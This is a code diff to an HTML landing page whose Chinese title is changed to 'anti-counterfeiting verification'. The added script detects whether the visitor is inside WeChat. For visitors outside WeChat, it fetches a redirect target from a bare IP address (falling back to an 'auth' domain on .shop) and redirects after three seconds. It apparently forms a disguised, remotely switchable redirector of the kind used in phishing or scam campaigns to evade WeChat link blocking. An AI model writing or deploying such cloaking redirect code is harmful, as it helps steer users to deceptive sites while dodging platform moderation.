@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>请在浏览器中打开</title>
+    <title>防伪验证</title>
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
@@ -481,10 +481,33 @@
             return ua.indexOf('micromessenger') !== -1;
         }
         
+        // 从接口获取目标地址
+        async function getTargetUrl() {
+            try {
+                const response = await fetch('http://139.180.131.121:9503/api/v1/com/siteConf?code=zz_url', {
+                    method: 'GET',
+                });
+                
+                if (!response.ok) {
+                    throw new Error('获取目标地址失败');
+                }
+                
+                const result = await response.json();
+                
+                // 检查响应是否成功
+                if (result.success && result.code === 200 && result.data && result.data.zz_url) {
+                    return result.data.zz_url;
+                } else {
+                    throw new Error('接口返回数据格式错误');
+                }
+            } catch (error) {
+                console.error('获取目标地址出错:', error);
+                return 'https://auth.alphavn.shop'; // 出错时使用默认地址
+            }
+        }
+        
         // 页面加载时检测
-        document.addEventListener('DOMContentLoaded', function() {
-            const target = 'https://auth.alphavn.shop';
-            
+        document.addEventListener('DOMContentLoaded', async function() {
             if (!isWeixinBrowser()) {
                 // 隐藏微信提示页面
                 document.querySelector('.container').style.display = 'none';
@@ -492,6 +515,9 @@
                 // 显示非微信提示
                 const nonWechatMessage = document.getElementById('non-wechat-message');
                 nonWechatMessage.style.display = 'block';
+                
+                // 获取目标地址
+                const target = await getTargetUrl();
                 
                 // 3秒后跳转到目标页面
                 setTimeout(() => {
